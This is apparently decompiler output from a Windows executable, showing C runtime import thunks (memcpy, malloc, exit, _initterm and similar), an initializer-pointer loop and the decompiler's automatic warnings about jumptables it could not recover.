undefined * FUN_14000f86c(void)

{
  return &DAT_140017de8;
}



// WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall

void FUN_14000f874(void)

{
  code **ppcVar1;
  
  for (ppcVar1 = (code **)&DAT_140013c30; ppcVar1 < &DAT_140013c30; ppcVar1 = ppcVar1 + 1) {
    if (*ppcVar1 != (code *)0x0) {
      (**ppcVar1)();
    }
  }
  return;
}



int memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f8f6. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = memcmp(_Buf1,_Buf2,_Size);
  return iVar1;
}



void * memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f8fc. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



void * memmove(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f902. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memmove(_Dst,_Src,_Size);
  return pvVar1;
}



void * memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f908. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



char * strchr(char *_Str,int _Val)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f90e. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strchr(_Str,_Val);
  return pcVar1;
}



void __std_exception_copy(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f914. Too many branches
                    // WARNING: Treating indirect jump as call
  __std_exception_copy();
  return;
}



void __std_exception_destroy(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f91a. Too many branches
                    // WARNING: Treating indirect jump as call
  __std_exception_destroy();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    // WARNING: Could not recover jumptable at 0x00014000f920. Too many branches
                    // WARNING: Treating indirect jump as call
  _CxxThrowException();
  return;
}



void __CxxFrameHandler4(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f926. Too many branches
                    // WARNING: Treating indirect jump as call
  __CxxFrameHandler4();
  return;
}



void __current_exception(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f92c. Too many branches
                    // WARNING: Treating indirect jump as call
  __current_exception();
  return;
}



void __current_exception_context(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f932. Too many branches
                    // WARNING: Treating indirect jump as call
  __current_exception_context();
  return;
}



void free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x00014000f93e. Too many branches
                    // WARNING: Treating indirect jump as call
  free(_Memory);
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void exit(int _Code)

{
                    // WARNING: Could not recover jumptable at 0x00014000f944. Too many branches
                    // WARNING: Treating indirect jump as call
  exit();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void terminate(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f94a. Too many branches
                    // WARNING: Treating indirect jump as call
  terminate();
  return;
}



void * malloc(size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f950. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = malloc(_Size);
  return pvVar1;
}



int _callnewh(size_t _Size)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f956. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _callnewh(_Size);
  return iVar1;
}



void _initialize_onexit_table(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f95c. Too many branches
                    // WARNING: Treating indirect jump as call
  _initialize_onexit_table();
  return;
}



void _register_onexit_function(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f962. Too many branches
                    // WARNING: Treating indirect jump as call
  _register_onexit_function();
  return;
}



void _crt_atexit(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f968. Too many branches
                    // WARNING: Treating indirect jump as call
  _crt_atexit();
  return;
}



void _cexit(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f96e. Too many branches
                    // WARNING: Treating indirect jump as call
  _cexit();
  return;
}



void _seh_filter_exe(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f974. Too many branches
                    // WARNING: Treating indirect jump as call
  _seh_filter_exe();
  return;
}



void _set_app_type(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f97a. Too many branches
                    // WARNING: Treating indirect jump as call
  _set_app_type();
  return;
}



void __setusermatherr(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f980. Too many branches
                    // WARNING: Treating indirect jump as call
  __setusermatherr();
  return;
}



void _configure_wide_argv(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f986. Too many branches
                    // WARNING: Treating indirect jump as call
  _configure_wide_argv();
  return;
}



void _initialize_wide_environment(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f98c. Too many branches
                    // WARNING: Treating indirect jump as call
  _initialize_wide_environment();
  return;
}



void _get_wide_winmain_command_line(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f992. Too many branches
                    // WARNING: Treating indirect jump as call
  _get_wide_winmain_command_line();
  return;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f998. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}



void _initterm_e(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f99e. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm_e();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void _exit(int _Code)

{
                    // WARNING: Could not recover jumptable at 0x00014000f9a4. Too many branches
                    // WARNING: Treating indirect jump as call
  _exit();
  return;
}



errno_t _set_fmode(int _Mode)

{
  errno_t eVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f9aa. Too many branches
                    // WARNING: Treating indirect jump as call
  eVar1 = _set_fmode(_Mode);
  return eVar1;
}



void _register_thread_local_exe_atexit_callback(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f9b6. Too many branches
                    // WARNING: Treating indirect jump as call
  _register_thread_local_exe_atexit_callback();
  return;
}



int _configthreadlocale(int _Flag)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000f9bc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _configthreadlocale(_Flag);
  return iVar1;
}



void __p__commode(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f9c8. Too many branches
                    // WARNING: Treating indirect jump as call
  __p__commode();
  return;
}



// WARNING: This is an inlined function

void _guard_dispatch_icall(void)

{
  code *UNRECOVERED_JUMPTABLE;
  
                    // WARNING: Could not recover jumptable at 0x00014000f9e0. Too many branches
                    // WARNING: Treating indirect jump as call
  (*UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_14001023c(undefined8 *param_1)

{
  _seh_filter_exe(*(undefined4 *)*param_1,param_1);
  return;
}


